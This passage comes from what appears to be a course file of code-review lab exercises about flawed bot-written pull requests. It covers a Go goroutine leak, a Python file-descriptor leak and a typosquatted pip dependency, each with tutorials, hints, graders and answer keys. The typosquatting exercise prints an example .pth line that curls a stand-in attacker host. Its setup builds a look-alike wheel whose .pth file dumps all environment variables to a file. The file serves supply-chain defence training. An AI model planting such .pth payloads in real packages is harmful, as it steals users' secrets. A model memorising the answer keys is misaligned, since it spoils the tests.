    			v, err := m.Get(ctx, key)
    			results <- result{v, err}
    		}(m)
    	}
    	var errs []error
    	for range mirrors {
    		select {
    		case r := <-results:
    			if r.err == nil {
    				return r.v, nil
    			}
    			errs = append(errs, r.err)
    		case <-ctx.Done():
    			return "", ctx.Err()
    		}
    	}
    	return "", errors.Join(errs...)
    }
    EOF
    ln() { git show pr:fastest.go | grep -nF -- "$1" | cut -d: -f1; }
    cat > /lab/findings.txt <<EOF
    fastest.go:$(ln 'results := make(chan string)')  unbuffered and read once: every losing goroutine blocks on its send forever (leak)
    fastest.go:$(ln 'if err == nil {')  errors are dropped, so when every mirror fails nothing is sent and Fastest waits until ctx ends (forever with Background)
    EOF

- id: prog-115
  title: Atomic writes that leak
  difficulty: 3
  kind: fix
  tags: [code-review, python, ai-code, files, resource-leak]
  tutorial: |
    **What you're learning.** Writing a file atomically without leaking file descriptors or leaving temporary files behind.

    ### The idea

    To replace a file so readers never see half of it, write a temporary file **in the same directory**, then `os.replace()` it over the target: a rename within one filesystem is atomic.

    `tempfile.mkstemp()` creates that temporary file and returns **two** things: an *open* file descriptor and the path. A descriptor is a plain integer, so Python can't close it for you when it goes out of scope. Code that ignores it and opens the path a second time leaks one descriptor per call; after `ulimit -n` calls (often 1024) every `open()` in the process fails with `OSError: [Errno 24] Too many open files`.

    ```python
    fd, tmp = tempfile.mkstemp(dir=folder, prefix=".tmp-")
    with os.fdopen(fd, "w", encoding="utf-8") as f:   # adopts fd: closed with f
        f.write(text)
    ```

    And if the write fails (disk full, bad data), the half-written temporary file must be removed and the target left as it was:

    ```python
    try:
        ...
        os.replace(tmp, target)
    except BaseException:
        os.unlink(tmp)
        raise
    ```

    `f.flush()` and `os.fsync(f.fileno())` before the rename make the new contents survive a power cut.

    ### Commands you'll use

    ```bash
    python3 - <<'PY'
    import os
    print(len(os.listdir("/proc/self/fd")), "descriptors open")   # count your own fds
    PY
    ls -l /proc/$PID/fd | wc -l        # another process's
    ```

    ### Common mistakes

    - `fd, path = mkstemp()` then `open(path)`: two descriptors, one never closed.
    - Cleaning up only on `Exception`, so Ctrl-C (`KeyboardInterrupt`) leaves junk.
    - A temp file in `/tmp` and the target elsewhere: the rename crosses filesystems and is no longer atomic (or fails with `EXDEV`).

    ### Check your work

    Hundreds of writes leave the descriptor count where it was, the target holds the last data, and a write that fails leaves the old contents and no `.tmp-` file.
  scenario: |
    **code-assistant[bot]**'s PR in **`/lab/repo`** makes the report
    exporter write files atomically with `write_atomic()`. The exporter now
    dies after a few hours with `Too many open files`, and the export
    folder fills with `.tmp-` files. (`/lab/PR.md`, `/lab/PR.diff`.)

    The PR has **two** defects:

    1. Write both to **`/lab/findings.txt`** (`FILE:LINE  what's wrong`,
       lines as in the PR version).
    2. Fix `exports/atomic.py` so `write_atomic(path, data)` still replaces
       `path` atomically (a temporary file in the same folder, then
       `os.replace`), **leaks no file descriptor**, and when writing fails
       raises the error, **leaves the old file unchanged** and **removes its
       temporary file**. Keep its name and arguments.
  hints:
    - "What does `tempfile.mkstemp()` return, and which part of it is ever closed?"
    - "`os.fdopen(fd, \"w\", encoding=\"utf-8\")` turns the descriptor into a file object that closes it."
    - "Call `write_atomic(p, b\"bytes\")`, then `ls -a` the folder."
  solution: |
    ```python
    def write_atomic(path, data):
        directory = os.path.dirname(os.path.abspath(path))
        fd, tmp = tempfile.mkstemp(dir=directory, prefix=".tmp-")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                f.write(data)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp, path)
        except BaseException:
            try:
                os.unlink(tmp)
            except FileNotFoundError:
                pass
            raise
    ```

    Findings: the `mkstemp` line (its descriptor is never closed) and the
    write/rename lines with no clean-up on failure.
  setup: |
    lab_file /lab/repo/exports/__init__.py </dev/null
    lab_file /lab/repo/exports/report.py <<'EOF'
    """Export the daily report as CSV."""


    def export(rows, path):
        with open(path, "w", encoding="utf-8") as f:
            for row in rows:
                f.write(",".join(str(v) for v in row) + "\n")
    EOF
    lab_file /lab/repo/tests/test_report.py <<'EOF'
    import os
    import tempfile
    import unittest

    from exports.report import export


    class TestReport(unittest.TestCase):
        def test_export(self):
            p = os.path.join(tempfile.mkdtemp(), "daily.csv")
            export([("north", 3), ("south", 4)], p)
            with open(p, encoding="utf-8") as f:
                self.assertEqual(f.read(), "north,3\nsouth,4\n")


    if __name__ == "__main__":
        unittest.main()
    EOF
    pr_base "Daily report export"
    lab_file /lab/repo/exports/atomic.py <<'EOF'
    """Atomic file writes: readers see the old file or the new one, never half of one."""
    import os
    import tempfile


    def write_atomic(path, data):
        """Replace the file at `path` with the text `data`, atomically."""
        directory = os.path.dirname(os.path.abspath(path))
        fd, tmp = tempfile.mkstemp(dir=directory, prefix=".tmp-")
        with open(tmp, "w", encoding="utf-8") as f:
            f.write(data)
        os.replace(tmp, path)
    EOF
    lab_file /lab/repo/exports/report.py <<'EOF'
    """Export the daily report as CSV."""
    from exports.atomic import write_atomic


    def export(rows, path):
        write_atomic(path, "".join(",".join(str(v) for v in row) + "\n" for row in rows))
    EOF
    pr_open fix/atomic-export "Write the report atomically" <<'EOF'
    The dashboard sometimes read a half-written `daily.csv`. The exporter now
    writes to a temporary file in the same folder and renames it over the old
    one, which is atomic on POSIX.

    `mkstemp` is used rather than a fixed name, so two exporters can't clash.

    **Testing:** `test_export` passes ✅
    EOF
  check: |
    check "findings.txt points at the descriptor that's never closed" "pr_finding exports/atomic.py $(pr_line exports/atomic.py 'tempfile.mkstemp(')"
    check "findings.txt points at the missing clean-up on failure" "pr_finding exports/atomic.py $(pr_line exports/atomic.py 'with open(tmp') $(pr_line exports/atomic.py 'f.write(data)') $(pr_line exports/atomic.py 'os.replace(')"
    check "findings.txt cites at most 4 lines" '[ "$(pr_findings_count)" -le 4 ]'
    pr_py_test <<'PY'
    import os, tempfile, unittest
    from exports.atomic import write_atomic


    def fds():
        return len(os.listdir("/proc/self/fd"))


    def read(p):
        with open(p, encoding="utf-8") as f:
            return f.read()


    class T(unittest.TestCase):
        def setUp(self):
            self.d = tempfile.mkdtemp()
            self.p = os.path.join(self.d, "daily.csv")

        def test_replaces(self):
            write_atomic(self.p, "a,1\n")
            write_atomic(self.p, "b,2\n")
            self.assertEqual(read(self.p), "b,2\n")
            self.assertEqual(os.listdir(self.d), ["daily.csv"])

        def test_no_fd_leak(self):
            before = fds()
            for i in range(300):
                write_atomic(self.p, f"{i}\n")
            self.assertLessEqual(fds(), before + 1, f"{fds() - before} descriptors leaked by 300 writes")
            self.assertEqual(read(self.p), "299\n")

        def test_failure_cleans_up(self):
            write_atomic(self.p, "old\n")
            before = fds()
            with self.assertRaises(TypeError):
                write_atomic(self.p, b"bytes, not text")
            self.assertEqual(read(self.p), "old\n")
            self.assertEqual(os.listdir(self.d), ["daily.csv"], "a temporary file was left behind")
            self.assertLessEqual(fds(), before + 1)

        def test_relative_path(self):
            cwd = os.getcwd()
            os.chdir(self.d)
            try:
                write_atomic("rel.csv", "x\n")
            finally:
                os.chdir(cwd)
            self.assertEqual(read(os.path.join(self.d, "rel.csv")), "x\n")


    unittest.main()
    PY
    rc=$?
    check "no descriptor leaks and failed writes leave nothing behind" '[ "$rc" -eq 0 ]'
    pr_unittest; urc=$?
    check "the repo's tests pass" '[ "$urc" -eq 0 ]'
  solve: |
    cd /lab/repo
    cat > exports/atomic.py <<'PY'
    """Atomic file writes: readers see the old file or the new one, never half of one."""
    import os
    import tempfile


    def write_atomic(path, data):
        """Replace the file at `path` with the text `data`, atomically."""
        directory = os.path.dirname(os.path.abspath(path))
        fd, tmp = tempfile.mkstemp(dir=directory, prefix=".tmp-")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                f.write(data)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp, path)
        except BaseException:
            try:
                os.unlink(tmp)
            except FileNotFoundError:
                pass
            raise
    PY
    ln() { git show pr:exports/atomic.py | grep -nF -- "$1" | cut -d: -f1; }
    cat > /lab/findings.txt <<EOF
    exports/atomic.py:$(ln 'tempfile.mkstemp(')  mkstemp's descriptor is never closed (the path is opened again): one fd leaked per call
    exports/atomic.py:$(ln 'with open(tmp')  no try/except: when writing fails the .tmp- file is left behind
    EOF

- id: prog-116
  title: One letter away from colorama
  difficulty: 3
  kind: fix
  tags: [code-review, python, ai-code, supply-chain, pip, typosquatting]
  tutorial: |
    **What you're learning.** Spotting a typo-squatted dependency, and pinning requirements by hash so pip installs exactly the files you reviewed.

    ### The idea

    Attackers publish packages whose names are one slip away from popular ones (`reqeusts`, `python-dateutils`, `colourama`; the last was a real malicious package in 2018). Coding assistants make it worse: they spell names from memory, and sometimes invent plausible names that don't exist, which attackers then register ("slopsquatting"). A look-alike usually **works**, because it bundles a copy of the real code, so nothing looks wrong.

    A wheel doesn't need you to import it to run code. Any `.pth` file it puts in `site-packages` is read at **every** interpreter start, and a line beginning with `import` is executed:

    ```text
    # evil.pth, installed next to the package
    import os; os.system("curl -s https://attacker.example/$(whoami)")
    ```

    Two defences:

    - **Read every new dependency's name** against the real project (its docs, the index page, who publishes it).
    - **Pin by hash.** With a `--hash` on every requirement, pip runs in *hash-checking mode*: it refuses any file whose SHA-256 isn't listed, so a swapped or look-alike file can't be installed, even from a compromised mirror.

    ```text
    # requirements.txt
    attrs==24.2.0 --hash=sha256:81921eb96de3191c8258c199618104dd27ac608d9366f5e35d011eae1867ede2
    ```

    ### Commands you'll use

    ```bash
    ls /lab/mirror                           # the wheels the company mirror offers
    python3 -m zipfile -l /lab/mirror/some_pkg-1.0-py3-none-any.whl   # what's inside a wheel
    unzip -p pkg.whl 'pkg-1.0.dist-info/METADATA'        # or: python3 -m zipfile -e pkg.whl /tmp/x
    sha256sum /lab/mirror/some_pkg-1.0-py3-none-any.whl  # the hash to pin
    # try an install the way CI does: offline, from the mirror, hashes required
    docker run --rm --network none -v /lab:/lab python:3.12-slim sh -c \
      'python -m venv /v && /v/bin/pip install --no-index --find-links /lab/mirror --require-hashes -r /lab/repo/requirements.txt && /v/bin/pip list'
    ```

    The VM's own `python3` has no pip, so installs run in the `python:3.12-slim` container.

    ### Common mistakes

    - Hashing the requirement line or the package name: the hash is of the **wheel file** pip downloads.
    - Pinning some lines only: with `--require-hashes` every requirement needs one, and an unpinned requirement makes pip refuse the whole file.
    - Deleting the look-alike import but leaving it in `requirements.txt`: installing it is enough to run its `.pth`.

    ### Check your work

    An offline install with `--require-hashes` succeeds, `pip list` shows the real package and not the look-alike, the tool still runs, and nothing the look-alike would have written exists.
  scenario: |
    **code-assistant[bot]**'s PR in **`/lab/repo`** adds coloured output to
    the sales report. Packages come from the company mirror,
    **`/lab/mirror`**, where anyone in the company can upload wheels. Read
    `/lab/PR.md`, `/lab/PR.diff` and the repo's README.

    1. Write the defect to **`/lab/findings.txt`** (`FILE:LINE  what's
       wrong`, line as in the PR version).
    2. Fix **`requirements.txt`** so the report gets the real package, and
       pin **every** requirement with `==` and a `--hash=sha256:...` of its
       wheel in `/lab/mirror`, so that
       `pip install --no-index --find-links /lab/mirror --require-hashes -r requirements.txt`
       installs it offline. `report.py` must still run.
  hints:
    - "Compare the new requirement with what `report.py` imports, and with the wheels in `/lab/mirror`."
    - "`python3 -m zipfile -l /lab/mirror/colourama-0.4.6-py3-none-any.whl`: what else does it install besides the package?"
    - "`sha256sum /lab/mirror/*.whl`, then one line per package: `name==version --hash=sha256:HEX`."
  solution: |
    `colourama` is a look-alike of `colorama`. It ships a copy of colorama
    (so the import works) plus `colourama.pth`, which runs at every Python
    start and writes the environment, secrets included, to a file.

    ```bash
    cd /lab/repo
    h() { sha256sum "/lab/mirror/$1" | cut -d' ' -f1; }
    cat > requirements.txt <<EOF
    tabulate==0.9.0 --hash=sha256:$(h tabulate-0.9.0-py3-none-any.whl)
    colorama==0.4.6 --hash=sha256:$(h colorama-0.4.6-py3-none-any.whl)
    EOF
    ```

    Findings: `requirements.txt:3` (the `colourama==0.4.6` line).
  setup: |
    mkdir -p /lab/mirror
    python3 - /lab/mirror <<'PY'
    import base64, hashlib, sys, zipfile

    out = sys.argv[1]


    def wheel(name, version, files, summary):
        dist = f"{name}-{version}.dist-info"
        files = dict(files)
        files[f"{dist}/METADATA"] = f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\nSummary: {summary}\n"
        files[f"{dist}/WHEEL"] = "Wheel-Version: 1.0\nGenerator: acme-mirror\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
        record = []
        for path, text in files.items():
            digest = base64.urlsafe_b64encode(hashlib.sha256(text.encode()).digest()).rstrip(b"=").decode()
            record.append(f"{path},sha256={digest},{len(text.encode())}")
        files[f"{dist}/RECORD"] = "\n".join(record + [f"{dist}/RECORD,,"]) + "\n"
        with zipfile.ZipFile(f"{out}/{name}-{version}-py3-none-any.whl", "w", zipfile.ZIP_DEFLATED) as z:
            for path, text in sorted(files.items()):
                info = zipfile.ZipInfo(path, date_time=(2024, 1, 1, 0, 0, 0))
                info.compress_type = zipfile.ZIP_DEFLATED
                z.writestr(info, text)


    TABULATE = '''"""Pretty-print tabular data (a cut-down build for the company mirror)."""
    __version__ = "0.9.0"


    def tabulate(rows, headers=()):
        table = ([[str(h) for h in headers]] if headers else []) + [[str(c) for c in r] for r in rows]
        widths = [max(len(r[i]) for r in table) for i in range(len(table[0]))]
        lines = ["  ".join(c.ljust(w) for c, w in zip(r, widths)).rstrip() for r in table]
        if headers:
            lines.insert(1, "  ".join("-" * w for w in widths))
        return "\\n".join(lines)
    '''

    COLORAMA = '''"""Cross-platform coloured terminal text (a cut-down build for the company mirror)."""
    __version__ = "0.4.6"


    class _Codes:
        def __init__(self, **codes):
            for name, code in codes.items():
                setattr(self, name, "\\033[%dm" % code)


    Fore = _Codes(BLACK=30, RED=31, GREEN=32, YELLOW=33, BLUE=34, MAGENTA=35, CYAN=36, WHITE=37, RESET=39)
    Style = _Codes(BRIGHT=1, DIM=2, NORMAL=22, RESET_ALL=0)


    def init(autoreset=False):
        """Nothing to do on Linux."""
    '''

    PTH = ('import os; open("/tmp/.colourama-cache", "w").write('
           '"\\n".join(k + "=" + v for k, v in os.environ.items()))\n')

    wheel("tabulate", "0.9.0", {"tabulate.py": TABULATE}, "Pretty-print tabular data")
    wheel("colorama", "0.4.6", {"colorama/__init__.py": COLORAMA}, "Cross-platform colored terminal text.")
    wheel("colourama", "0.4.6", {"colorama/__init__.py": COLORAMA, "colourama.pth": PTH},
          "Cross-platform colored terminal text, faster fork.")
    PY
    lab_file /lab/repo/README.md <<'EOF'
    # Sales report

    `python3 report.py` prints the weekly sales by region.

    ## Dependencies

    Packages come only from the company mirror (`/lab/mirror`). CI installs
    them offline:

        pip install --no-index --find-links /lab/mirror --require-hashes -r requirements.txt

    so every requirement must be pinned with `==` **and** `--hash=sha256:`
    (the SHA-256 of its wheel). New dependencies need a reviewer to check the
    name and the publisher.
    EOF
    lab_file /lab/repo/requirements.txt <<'EOF'
    # Runtime dependencies of the report tool
    tabulate==0.9.0
    EOF
    lab_file /lab/repo/report.py <<'EOF'
    """Print the weekly sales report as a table."""
    import sys

    from tabulate import tabulate

    ROWS = [("north", 1200), ("south", 950), ("east", 1730)]


    def render(rows):
        return tabulate(rows, headers=["region", "sales"])


    if __name__ == "__main__":
        sys.stdout.write(render(ROWS) + "\n")
    EOF
    pr_base "Weekly sales report"
    lab_file /lab/repo/requirements.txt <<'EOF'
    # Runtime dependencies of the report tool
    tabulate==0.9.0
    colourama==0.4.6
    EOF
    lab_file /lab/repo/report.py <<'EOF'
